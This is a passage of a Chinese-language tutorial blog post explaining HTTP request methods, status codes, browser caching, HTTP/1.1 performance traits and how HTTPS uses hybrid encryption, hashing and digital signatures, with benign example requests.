class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>foo.example<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><br><span class="language-ini"><span class="hljs-attr">field1</span>=value1&amp;field2=value2</span><br></code></pre></td></tr></table></figure><p>使用 <code>multipart/form-data</code> 作为 content type 的表单：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>foo.example<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data;boundary=&quot;boundary&quot;<br><br><span class="language-pgsql"><span class="hljs-comment">--boundary</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;field1&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">value1</span><br><span class="language-pgsql"><span class="hljs-comment">--boundary</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;field2&quot;; filename=&quot;example.txt&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">value2</span><br><span class="language-pgsql"><span class="hljs-comment">--boundary--</span></span><br></code></pre></td></tr></table></figure><h3 id="head">1.3.3 HEAD</h3><p><strong>HTTP <code>HEAD</code>方法</strong>请求资源的标头信息，并且这些标头与 HTTP<code>GET</code>方法请求时返回的一致。该请求方法的一个使用场景是在下载一个大文件前先通过<code>HEAD</code> 请求读取其<code>Content-Length</code>标头的值获取文件的大小，而无需实际下载文件，以此可以节约带宽资源。</p><blockquote><p><strong>警告：</strong> <code>HEAD</code>方法的响应不应包含响应主体。即使包含了响应主体，也必须忽略掉：任何（可能用于描述错误响应主体的）表示标头会被假定为在发送相似的<code>GET</code> 请求时也会接收到。</p></blockquote><table><thead><tr class="header"><th style="text-align: left;">请求是否有主体</th><th>否</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">成功的响应是否有主体</td><td>否</td></tr><tr class="even"><td style="text-align: left;">安全</td><td>是</td></tr><tr class="odd"><td style="text-align: left;">幂等</td><td>是</td></tr><tr class="even"><td style="text-align: left;">可缓存</td><td>是</td></tr><tr class="odd"><td style="text-align: left;">允许在 HTML 表单中使用</td><td>不允许</td></tr></tbody></table><p><strong>语法：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">HEAD /index.html<br></code></pre></td></tr></table></figure><h3 id="put">1.3.4 PUT</h3><p><strong>HTTP <code>PUT</code>请求方法</strong>创建一个新的资源或用请求的有效载荷替换目标资源的表示。</p><table><thead><tr class="header"><th style="text-align: left;">请求是否有主体</th><th>是</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">成功的响应是否有主体</td><td>可能有</td></tr><tr class="even"><td style="text-align: left;">安全</td><td>否</td></tr><tr class="odd"><td style="text-align: left;">幂等</td><td>是</td></tr><tr class="even"><td style="text-align: left;">可缓存</td><td>否</td></tr><tr class="odd"><td style="text-align: left;">允许在 HTML 表单中使用</td><td>不允许</td></tr></tbody></table><p><strong>语法：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/new.html</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><ol type="1"><li><p>请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/new.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Content-type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">Content-length</span><span class="hljs-punctuation">: </span>16<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>新文件<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></code></pre></td></tr></table></figure></li><li><p>响应</p><ul><li><p>如果目标资源没有当前的表示，并且 <code>PUT</code>方法成功创建了资源，那么源服务器必须返回<code>201</code>（<code>Created</code>）来通知用户代理资源已创建。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">201</span> Created<br><span class="hljs-attribute">Content-Location</span><span class="hljs-punctuation">: </span>/new.html<br></code></pre></td></tr></table></figure></li><li><p>如果目标资源已经存在，并且依照请求中封装的表现形式成功进行了更新，那么，源服务器必须返回<code>200</code>（<code>OK</code>）或<code>204</code>（<code>No Content</code>）来表示请求成功完成。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">204</span> No Content<br><span class="hljs-attribute">Content-Location</span><span class="hljs-punctuation">: </span>/existing.html<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="delete">1.3.5 DELETE</h3><p><strong>HTTP <code>DELETE</code>请求方法</strong>用于删除指定的资源。</p><table><thead><tr class="header"><th style="text-align: left;">请求是否有主体</th><th>可能有</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">成功的响应是否有主体</td><td>可能有</td></tr><tr class="even"><td style="text-align: left;">安全</td><td>否</td></tr><tr class="odd"><td style="text-align: left;">幂等</td><td>是</td></tr><tr class="even"><td style="text-align: left;">可缓存</td><td>否</td></tr><tr class="odd"><td style="text-align: left;">允许在 HTML 表单中使用</td><td>不允许</td></tr></tbody></table><p><strong>语法：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">DELETE</span> <span class="hljs-string">/file.html</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><ol type="1"><li><p>请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">DELETE</span> <span class="hljs-string">/file.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br></code></pre></td></tr></table></figure></li><li><p>响应：如果 <code>DELETE</code>方法成功执行，那么可能会有以下几种状态码：</p><ul><li>状态码<code>202</code>（<code>Accepted</code>）表示请求的操作可能会成功执行，但是尚未开始执行。</li><li>状态码<code>204</code>（<code>No Content</code>）表示操作已执行，但是没有进一步的相关信息。</li><li>状态码<code>200</code>（<code>OK</code>）表示操作已执行，并且响应中提供了相关状态的描述信息。</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Wed, 21 Oct 2015 07:28:00 GMT<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>文件已删除。<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure></li></ol><h2 id="http-响应状态码">1.4 HTTP 响应状态码</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612795.png"alt="image-20240324140310527" /><figcaption aria-hidden="true">image-20240324140310527</figcaption></figure><h3 id="xx">1.4.1 1xx</h3><p><code>1xx</code>类状态码属于<strong>提示信息</strong>，是协议处理中的一种中间状态，实际用到的比较少。</p><h3 id="xx-1">1.4.2 2xx</h3><p><code>2xx</code>类状态码表示服务器<strong>成功</strong>处理了客户端的请求，也是我们最希望看到的状态。</p><ul><li>「<strong>200OK</strong>」是最常见的成功状态码，表示一切正常。如果是非<code>HEAD</code> 请求，服务器返回的响应会有主体数据。</li><li>「<strong>204 NoContent</strong>」表示该请求已成功，但是客户端客户不需要离开当前页面。使用惯例是，在PUT 请求中进行资源更新，但是不需要改变当前展示给用户的页面，那么返回 204No Content。</li><li>「<strong>206 PartialContent</strong>」表示请求已成功，并且主体包含所请求的数据区间，该数据区间是在请求的<code>Range</code>首部指定的。</li></ul><h3 id="xx-2">1.4.3 3xx</h3><p><code>3xx</code>类状态码表示客户端请求的资源发生了变动，需要客户端用新的 URL重新发送请求获取资源，也就是<strong>重定向</strong>。</p><ul><li>「<strong>301 MovedPermanently</strong>」表示永久重定向，说明请求的资源已经不存在了，需改用新的URL 再次访问。</li><li>「<strong>302Found</strong>」表示临时重定向，说明请求的资源还在，但暂时需要用另一个URL 来访问。</li></ul><p>301 和 302 都会在响应头里使用字段<code>Location</code>，指明后续要跳转的 URL，浏览器会自动重定向新的URL。</p><ul><li>「<strong>304 NotModified</strong>」不具有跳转的含义，表示资源未修改，重定向已存在的缓冲文件，也称缓存重定向，也就是告诉客户端可以继续使用缓存资源，用于缓存控制。</li></ul><h3 id="xx-3">1.4.4 4xx</h3><p><code>4xx</code>类状态码表示客户端发送的报文有误，服务器无法处理，属于<strong>客户端</strong>的错误码。</p><ul><li>「<strong>400 BadRequest</strong>」表示服务器因某些被认为是客户端错误的原因（例如，请求语法错误、无效请求消息格式或者欺骗性请求路由），而无法或不会处理该请求。</li><li>「<strong>403Forbidden</strong>」表示服务器端有能力处理该请求，但是拒绝授权访问。</li><li>「<strong>404 NotFound</strong>」表示服务器无法找到所请求的资源。</li></ul><h3 id="xx-4">1.4.5 5xx</h3><p><code>5xx</code>类状态码表示客户端请求报文正确，但是服务器处理时内部发生了错误，属于<strong>服务器端</strong>的错误码。</p><ul><li>「<strong>500 Internal ServerError</strong>」意味着所请求的服务器遇到意外的情况并阻止其执行请求。这个错误代码和400一样，是一个通用的“万能”响应代码。</li><li>「<strong>501 NotImplemented</strong>」表示请求的方法不被服务器支持，因此无法被处理。服务器必须支持的方法（即不会返回这个状态码的方法）只有GET 和 HEAD。</li><li>「<strong>502 BadGateway</strong>」表示作为网关或代理的服务器，从上游服务器中接收到的响应是无效的。</li><li>「<strong>503 ServiceUnavailable</strong>」表示扮演网关或者代理的服务器无法在规定的时间内获得想要的响应。</li></ul><h1 id="http-缓存技术">2. HTTP 缓存技术</h1><h2 id="http-缓存类型">2.1 HTTP 缓存类型</h2><p>对于重复性的 HTTP请求，比如每次请求得到的数据都一样的，我们可以把这对「请求-响应」的数据都<strong>缓存在本地</strong>，那么下次就直接读取本地的数据，不必在通过网络获取服务器的响应了，这样的话HTTP/1.1 的性能肯定能够显著提升。</p><p>HTTP缓存有两种实现方式，分别是<strong>强制缓存和协商缓存</strong>。</p><h2 id="强制缓存">2.2 强制缓存</h2><p>强制缓存：只要浏览器判断缓存没有过期，则直接使用浏览器的本地缓存，决定是否使用缓存的主动性在于<strong>浏览器</strong>这边。</p><p><strong>实现方式：</strong>利用下面这两个 HTTP 响应头部（ResponseHeader）字段实现的，它们都用来表示资源在客户端缓存的有效期：</p><ul><li><code>Cache-Control</code>， 是一个相对时间；</li><li><code>Expires</code>，是一个绝对时间；</li></ul><p>如果 HTTP 响应头部同时有 Cache-Control 和 Expires字段的话，<strong>Cache-Control 的优先级高于 Expires</strong>。Cache-control 选项更多，设置更加精细，所以建议使用 Cache-Control来实现强制缓存。具体的实现流程如下：</p><ul><li>当浏览器第一次请求访问服务器资源时，服务器会在返回这个资源的同时，在Response 头部加上 Cache-Control，Cache-Control中设置了过期时间大小；</li><li>浏览器再次请求访问服务器中的该资源时，会先<strong>通过请求资源的时间与Cache-Control中设置的过期时间大小，来计算出该资源是否过期</strong>，如果没有，则使用该缓存，否则重新请求服务器；</li><li>服务器再次收到请求后，会再次更新 Response 头部的Cache-Control。</li></ul><p><strong>示例</strong>：下图中了返回 200 状态码，但在 size项中标识的是 from disk cache，就是使用了强制缓存。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612804.png"alt="image-20240324143206544" /><figcaption aria-hidden="true">image-20240324143206544</figcaption></figure><h2 id="协商缓存">2.3 协商缓存</h2><p>当我们在浏览器使用开发者工具的时候，你可能会看到过某些请求的响应码是<code>304</code>，这个是告诉浏览器可以使用本地缓存的资源，通常这种通过<strong>服务端告知客户端</strong>是否可以使用缓存的方式被称为协商缓存。</p><p><strong>实现方式：</strong></p><ul><li>第一种：请求头部中的 <code>If-Modified-Since</code>字段与响应头部中的 <code>Last-Modified</code> 字段实现：<ul><li>响应头部中的<code>Last-Modified</code>：标示这个响应资源的最后修改时间；</li><li>请求头部中的<code>If-Modified-Since</code>：当资源过期时，浏览器发现响应头里有<code>Last-Modified</code> ，则再次向服务器发起请求时，会将请求头<code>If-Modified-Since</code> 值设置为 <code>Last-Modified</code>的值。服务器收到请求后发现有<code>If-Modified-Since</code>，则与被请求资源的最后修改时间<code>Last-Modified</code>进行对比。如果最后修改时间较新（大），说明资源又被改过，则返回新的资源，HTTP200 OK；如果最后修改时间较旧（小），说明资源无新改动，响应 HTTP 304走缓存。</li></ul></li><li>第二种：请求头部中的 <code>If-None-Match</code> 字段与响应头部中的<code>ETag</code> 字段实现：<ul><li>响应头部中 <code>Etag</code>：唯一标识响应资源；</li><li>请求头部中的<code>If-None-Match</code>：当资源过期时，浏览器发现响应头里有Etag，则再次向服务器发起请求时，会将请求头 <code>If-None-Match</code>值设置为 Etag 的值。服务器收到请求后进行比对，如果资源没有变化返回304，如果资源变化了返回 200。</li></ul></li></ul><p>第一种实现方式是基于<strong>时间</strong>实现的，第二种实现方式是基于<strong>唯一标识</strong>实现的，相对来说后者可以更加准确地判断文件内容是否被修改，避免由于时间篡改导致的不可靠问题。</p><p>如果在第一次请求资源的时候，服务端返回的 HTTP 响应头部同时有 Etag 和Last-Modified 字段，那么客户端再下一次请求的时候，如果带上了 ETag 和Last-Modified 字段信息给服务端，这时 <strong>Etag的优先级更高</strong>，也就是服务端先会判断 Etag 是否变化了，如果 Etag有变化就不用在判断 Last-Modified 了，如果 Etag 没有变化，然后再看Last-Modified。</p><p><strong>为什么 ETag 的优先级更高？</strong>这是因为 ETag 主要能解决Last-Modified 几个比较难以解决的问题：</p><ol type="1"><li>在没有修改文件内容情况下文件的最后修改时间可能也会改变，这会导致客户端认为这文件被改动了，从而重新请求；</li><li>可能有些文件是在秒级以内修改的，<code>If-Modified-Since</code>能检查到的粒度是秒级的，使用 Etag就能够保证这种需求下客户端在 1秒内能刷新多次；</li><li>有些服务器不能精确获取文件的最后修改时间。</li></ol><blockquote><p>注意，协商缓存这两个字段都需要配合强制缓存中 Cache-Control字段来使用，只有在未能命中强制缓存的时候，才能发起带有协商缓存字段的请求。</p></blockquote><p>下图是强制缓存和协商缓存的工作流程：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612806.png"alt="image-20240324144057749" /><figcaption aria-hidden="true">image-20240324144057749</figcaption></figure><p><strong>示例：</strong>下图就是一个使用 ETag字段实现的协商缓存过程，所以协商缓存就是<strong>客户端与服务端协商之后，通过协商结果来判断是否使用本地缓存</strong>。</p><ul><li>当浏览器第一次请求访问服务器资源时，服务器会在返回这个资源的同时，在Response 头部加上 ETag唯一标识，这个唯一标识的值是根据当前请求的资源生成的；</li><li>当浏览器再次请求访问服务器中的该资源时，首先会先检查强制缓存是否过期：<ul><li>如果没有过期，则直接使用本地缓存；</li><li>如果缓存过期了，会在 Request 头部加上 If-None-Match字段，该字段的值就是 ETag 唯一标识；</li></ul></li><li>服务器再次收到请求后，会根据请求中的 If-None-Match值与当前请求的资源生成的唯一标识进行比较：<ul><li>如果值相等，则返回 304 Not Modified，不会返回资源；</li><li>如果不相等，则返回 200 状态码和返回资源，并在 Response 头部加上新的ETag 唯一标识；</li></ul></li><li>如果浏览器收到 304的请求响应状态码，则会从本地缓存中加载资源，否则更新资源。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612805.png"alt="image-20240324143558474" /><figcaption aria-hidden="true">image-20240324143558474</figcaption></figure><h1 id="http-特性">3. HTTP 特性</h1><p>目前为止，HTTP 常见的版本有 HTTP/1.1，HTTP/2.0，HTTP/3.0，不同版本的HTTP 特性是不一样的。</p><h2 id="http1.1-优点">3.1 HTTP/1.1 优点</h2><p>HTTP最突出的优点是<strong>简单、灵活和易于扩展、应用广泛和跨平台</strong>。</p><p><em>1. 简单</em></p><p>HTTP 基本的报文格式就是 <code>header + body</code>，头部信息也是<code>key-value</code>简单文本的形式，<strong>易于理解</strong>，降低了学习和使用的门槛。</p><p><em>2. 灵活和易于扩展</em></p><p>HTTP协议里的各类请求方法、URI/URL、状态码、头字段等每个组成要求都没有被固定死，都允许开发人员<strong>自定义和扩充</strong>。</p><p>同时 HTTP 由于是工作在应用层（ <code>OSI</code>第七层），则它<strong>下层可以随意变化</strong>，比如：</p><ul><li>HTTPS 就是在 HTTP 与 TCP 层之间增加了 SSL/TLS 安全传输层；</li><li>HTTP/1.1 和 HTTP/2.0 传输协议使用的是 TCP 协议，而到了 HTTP/3.0传输协议改用了 UDP 协议。</li></ul><p><em>3. 应用广泛和跨平台</em></p><p>互联网发展至今，HTTP的应用范围非常的广泛，从台式机的浏览器到手机上的各种APP，从看新闻、刷贴吧到购物、理财、吃鸡，HTTP的应用遍地开花，同时天然具有<strong>跨平台</strong>的优越性。</p><h2 id="http1.1-缺点">3.2 HTTP/1.1 缺点</h2><p>HTTP协议里有优缺点一体的<strong>双刃剑</strong>，分别是<strong>无状态、明文传输</strong>，同时还有一大缺点<strong>不安全</strong>。</p><p><em>1. 无状态双刃剑</em></p><ul><li><p><strong>好处</strong>：服务器不会去保持HTTP的状态，所以不需要额外的资源来记录状态信息，这能减轻服务器的负担，能够把更多的CPU 和内存用来对外提供服务。</p></li><li><p><strong>坏处</strong>：因为服务器没有记忆能力，它在完成有关联性的操作时会非常麻烦。例如登录-&gt;添加购物车-&gt;下单-&gt;结算-&gt;支付，这系列操作都要知道用户的身份才行。但服务器不知道这些请求是有关联的，每次都要问一遍身份信息。</p></li><li><p><strong>解决方案：</strong>Cookie技术（通过在请求和响应报文中写入 Cookie信息来控制客户端的状态。相当于，在客户端第一次请求后，服务器会下发一个装有客户信息的「小贴纸」，后续客户端请求服务器的时候，带上「小贴纸」，服务器就能认出你了。）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612807.png"alt="image-20240324145135744" /><figcaption aria-hidden="true">image-20240324145135744</figcaption></figure></li></ul><p><em>2. 明文传输双刃剑</em></p><ul><li><strong>好处</strong>：在传输过程中的信息，是可方便阅读的，通过Wireshark 抓包可以直接查看，为我们调试工作带了极大的便利性。</li><li><strong>坏处</strong>：HTTP的所有信息都暴露在了光天化日下，相当于信息裸奔。在传输的漫长的过程中，信息的内容都毫无隐私可言，很容易就能被窃取，如果里面有你的账号密码信息，那你号没了。</li></ul><p><em>3. 不安全</em></p><p>HTTP 比较严重的缺点就是不安全：</p><ul><li>通信使用明文（不加密），内容可能会被<strong>窃听</strong>。比如，账号信息容易泄漏，那你号没了。</li><li>不验证通信方的身份，因此有可能遭遇<strong>伪装</strong>。比如，访问假的淘宝、拼多多，那你钱没了。</li><li>无法证明报文的完整性，所以有可能已遭<strong>篡改</strong>。比如，网页上植入垃圾广告，视觉污染，眼没了。</li></ul><p>HTTP 的安全问题，可以用 HTTPS 的方式解决，也就是通过引入 SSL/TLS层，使得在安全上达到了极致。</p><h2 id="http1.1-性能">3.3 HTTP/1.1 性能</h2><p>HTTP 协议是基于 <strong>TCP/IP</strong>，并且使用了「<strong>请求 -应答</strong>」的通信模式，所以性能的关键就在这两点里。</p><h3 id="长连接">3.3.1 长连接</h3><p>早期 HTTP/1.0性能上的一个很大的问题，那就是每发起一个请求，都要新建一次 TCP连接（三次握手），而且是串行请求，做了无谓的 TCP连接建立和断开，增加了通信开销。为了解决上述 TCP 连接问题，HTTP/1.1提出了<strong>长连接</strong>的通信方式，也叫<strong>持久连接</strong>。这种方式的好处在于减少了TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。</p><p>持久连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP连接状态。当然，如果某个 HTTP长连接超过一定时间没有任何数据交互，服务端就会主动断开这个连接。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612809.png"alt="image-20240324145507685" /><figcaption aria-hidden="true">image-20240324145507685</figcaption></figure><h3 id="管道网络传输">3.3.2 管道网络传输</h3><p>HTTP/1.1采用了长连接的方式，这使得管道（pipeline）网络传输成为了可能。即可在同一个TCP连接里面，客户端可以发起多个请求，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以<strong>减少整体的响应时间。</strong></p><p>举例来说，客户端需要请求两个资源。以前的做法是，在同一个 TCP连接里面，先发送 A 请求，然后等待服务器做出回应，收到后再发出 B请求。那么，管道机制则是允许浏览器同时发出 A 请求和 B 请求，如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612810.png"alt="image-20240324145626578" /><figcaption aria-hidden="true">image-20240324145626578</figcaption></figure><p>但是<strong>服务器必须按照接收请求的顺序发送对这些管道化请求的响应</strong>。如果服务端在处理A请求时耗时比较长，那么后续的请求的处理都会被阻塞住，这称为「队头堵塞」。<strong>HTTP/1.1管道解决了请求的队头阻塞，但是没有解决响应的队头阻塞</strong>。</p><blockquote><p>注意：实际上 HTTP/1.1管道化技术不是默认开启，而且浏览器基本都没有支持，所以后面所有文章讨论HTTP/1.1都是建立在没有使用管道化的前提。大家知道有这个功能，但是没有被使用就行了。</p></blockquote><h3 id="队头阻塞">3.3.3 队头阻塞</h3><p>「请求 - 应答」的模式会造成 HTTP的性能问题。为什么呢？因为当顺序发送的请求序列中的一个请求因为某种原因被阻塞时，在后面排队的所有请求也一同被阻塞了，会招致客户端一直请求不到数据，这也就是「<strong>队头阻塞</strong>」，好比上班的路上塞车。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612811.png"alt="image-20240324145850857" /><figcaption aria-hidden="true">image-20240324145850857</figcaption></figure><h3 id="小结">3.3.4 小结</h3><p>HTTP/1.1 的性能一般般，后续的 HTTP/2 和 HTTP/3 就是在优化 HTTP的性能。</p><h1 id="http-与-https">4. HTTP 与 HTTPS</h1><h2 id="http-与-https-对比">4.1 HTTP 与 HTTPS 对比</h2><table><thead><tr class="header"><th></th><th>HTTP</th><th>HTTPS</th></tr></thead><tbody><tr class="odd"><td>传输方式</td><td>明文</td><td>密文</td></tr><tr class="even"><td>连接建立</td><td>TCP三次握手</td><td>TCP三次握手+SSL/TLS握手</td></tr><tr class="odd"><td>默认端口</td><td>80</td><td>443</td></tr><tr class="even"><td>证书</td><td>不需要</td><td>需要</td></tr></tbody></table><h2 id="https-解决的安全问题">4.2 HTTPS 解决的安全问题</h2><p>HTTP 由于是明文传输，所以安全上存在以下三个风险：</p><ul><li><strong>窃听</strong>：比如通信链路上可以获取通信内容，用户号容易没。</li><li><strong>篡改</strong>：比如强制植入垃圾广告，视觉污染，用户眼容易瞎。</li><li><strong>冒充</strong>：比如冒充淘宝网站，用户钱容易没。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612812.png"alt="image-20240324150029565" /><figcaption aria-hidden="true">image-20240324150029565</figcaption></figure><p>HTTP<strong>S</strong> 在 HTTP 与 TCP 层之间加入了<code>SSL/TLS</code> 协议，可以很好的解决了上述的风险：</p><ul><li><strong>信息加密</strong>：交互信息无法被窃取，但你的号会因为「自身忘记」账号而没。</li><li><strong>校验机制</strong>：无法篡改通信内容，篡改了就不能正常显示，但百度「竞价排名」依然可以搜索垃圾广告。</li><li><strong>身份证书</strong>：证明淘宝是真的淘宝网，但你的钱还是会因为「剁手」而没。</li></ul><p>HTTPS 是如何解决上面的三个风险的？</p><ul><li><strong>混合加密</strong>的方式实现信息的<strong>机密性</strong>，解决了窃听的风险。</li><li><strong>摘要算法</strong>的方式来实现<strong>完整性</strong>，它能够为数据生成独一无二的「指纹」，指纹用于校验数据的完整性，解决了篡改的风险。</li><li>将服务器公钥放入到<strong>数字证书</strong>中，解决了冒充的风险。</li></ul><h3 id="混合加密">4.2.1 混合加密</h3><p>通过<strong>混合加密</strong>的方式可以保证信息的<strong>机密性</strong>，解决了窃听的风险。HTTPS采用的是<strong>对称加密</strong>和<strong>非对称加密</strong>结合的「混合加密」方式：</p><ul><li>在通信建立前采用<strong>非对称加密</strong>的方式交换「会话秘钥」，后续就不再使用非对称加密。</li><li>在通信过程中全部使用<strong>对称加密</strong>的「会话秘钥」的方式加密明文数据。</li></ul><p>采用「混合加密」的方式的原因：</p><ul><li><strong>非对称加密</strong>：公钥和私钥，公钥可以任意分发但私钥必须保密，解决了密钥交换问题但速度慢。</li><li><strong>对称加密</strong>：一个密钥，运算速度快，密钥必须保密，无法做到安全的密钥交换。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612813.png"alt="image-20240324150243495" /><figcaption aria-hidden="true">image-20240324150243495</figcaption></figure><h3 id="摘要算法">4.2.2 摘要算法</h3><p>为了保证传输的内容不被篡改，我们需要对内容计算出一个「指纹」，然后同内容一起传输给对方。对方收到后，先是对内容也计算出一个「指纹」，然后跟发送方发送的「指纹」做一个比较，如果「指纹」相同，说明内容没有被篡改，否则就可以判断出内容被篡改了。在计算机里会<strong>用摘要算法（哈希函数）来计算出内容的哈希值</strong>，也就是内容的「指纹」，这个<strong>哈希值是唯一的，且无法通过哈希值推导出内容</strong>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612814.png"alt="image-20240324150424928" /><figcaption aria-hidden="true">image-20240324150424928</figcaption></figure><h3 id="数字签名">4.2.3 数字签名</h3><p>通过哈希算法可以确保内容不会被篡改，但是并不能保证「内容 +哈希值」不会被<strong>中间人替换</strong>，因为这里缺少对客户端收到的消息是否来源于服务端的证明。</p><p>举个例子，你想向老师请假，一般来说是要求由家长写一份请假理由并签名，老师才能允许你请假。但是你有模仿你爸爸字迹的能力，你用你爸爸的字迹写了一份请假理由然后签上你爸爸的名字，老师一看到这个请假条，查看字迹和签名，就误以为是你爸爸写的，就会允许你请假。那作为老师，要如何避免这种情况发生呢？现实生活中的，可以通过电话或视频来确认是否是由父母发出的请假，但是计算机里可没有这种操作。</p><p>为了避免这种情况，计算机里会用<strong>非对称加密算法</strong>来解决，共有两个密钥：</p><ul><li>一个是公钥，这个是可以公开给所有人的；</li><li>一个是私钥，这个必须由本人管理，不可泄露。</li></ul><p>这两个密钥可以<strong>双向加解密</strong>的，比如可以用公钥加密内容，然后用私钥解密，也可以用私钥加密内容，公钥解密内容。流程的不同，意味着目的也不相同：</p><ul><li><strong>公钥加密，私钥解密</strong>。这个目的是为了<strong>保证内容传输的安全</strong>，因为被公钥加密的内容，其他人是无法解密的，只有持有私钥的人，才能解密出实际的内容；</li><li><strong>私钥加密，公钥解密</strong>。这个目的是为了<strong>保证消息不会被冒充</strong>，因为私钥是不可泄露的，如果公钥能正常解密出私钥加密的内容，就能证明这个消息是来源于持有私钥身份的人发送的。</li></ul><p>一般我们不会用非对称加密来加密实际的传输内容，因为非对称加密的计算比较耗费性能的。所以非对称加密的用途主要在于通过<strong>私钥加密，公钥解密</strong>的方式，来确认消息的身份，我们常说的<strong>数字签名算法</strong>，就是用的是这种方式，不过私钥加密内容不是内容本身，而是<strong>对内容的哈希值加密</strong>。私钥是由服务端保管，然后服务端会向客户端颁发对应的公钥。如果客户端收到的信息，能被公钥解密，就说明该消息是由服务器发送的。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403241612815.png"alt="image-20240324150753226" /><figcaption 